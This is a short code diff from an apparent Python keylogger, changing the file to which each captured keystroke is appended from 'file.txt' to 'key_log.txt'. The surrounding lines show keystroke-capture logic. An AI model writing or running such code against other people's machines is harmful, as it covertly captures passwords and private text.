@@ -22,7 +22,7 @@ def on_press(key):
                 
         else:
                 
-            with open("file.txt", "a") as file:
+            with open("key_log.txt", "a") as file:
                 file.write(f"{key.char}")
     except AttributeError:
         pass
